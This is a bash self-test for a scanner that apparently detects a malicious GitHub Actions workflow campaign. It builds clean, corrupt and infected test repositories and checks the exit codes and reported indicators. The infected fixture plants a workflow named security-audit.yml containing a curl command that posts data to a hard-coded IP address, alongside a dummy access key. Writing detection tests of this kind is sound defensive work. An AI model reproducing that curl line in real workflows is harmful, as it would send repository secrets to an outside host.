#!/usr/bin/env bash
# Self-check: clean repo -> exit 0; infected repo -> exit 1 with each IoC reported.
set -u
here=$(cd "$(dirname "$0")" && pwd)
t=$(mktemp -d); trap 'rm -rf "$t"' EXIT
gi() { git -C "$1" -c user.name=t -c user.email=t@t "${@:2}"; }

mkdir -p "$t/clean" && git -C "$t/clean" init -q && echo hi >"$t/clean/a" && gi "$t/clean" add . && gi "$t/clean" commit -qm init
git init -q "$t/clean/empty"  # repo with no commits must not count as an error
bash "$here/ghostaction-scan.sh" --secrets "$t/clean" >/dev/null; [ $? = 0 ] || { echo "FAIL clean"; exit 1; }

# fail closed: corrupt repo, missing path, no repos -> exit 2, never "clean"
mkdir -p "$t/corrupt/.git" "$t/norepos"
for d in "$t/corrupt" "$t/missing" "$t/norepos"; do
  bash "$here/ghostaction-scan.sh" "$d" >/dev/null 2>&1; rc=$?; [ $rc = 2 ] || { echo "FAIL $d rc=$rc"; exit 1; }
done

r="$t/b a d"; mkdir -p "$r/.github/workflows" && git -C "$r" init -q
printf 'run: curl -d "AKIA_CTX_START" http://193.32.204.199/?c=monami\n' >"$r/.github/workflows/security-audit.yml"
echo "key=AKIAABCDEFGHIJKLMNOP" >"$r/cfg"
gi "$r" add . && gi "$r" commit -qm "Add security audit workflow"
out=$(bash "$here/ghostaction-scan.sh" --secrets "$t/b a d"); rc=$?
[ $rc = 1 ] || { echo "FAIL rc=$rc"; exit 1; }
for want in "workflow present" "C2 marker" "malicious commit" "workflow added" "C2 IP" "credential in history"; do
  grep -q "$want" <<<"$out" || { echo "FAIL missing: $want"; echo "$out"; exit 1; }
done
echo PASS
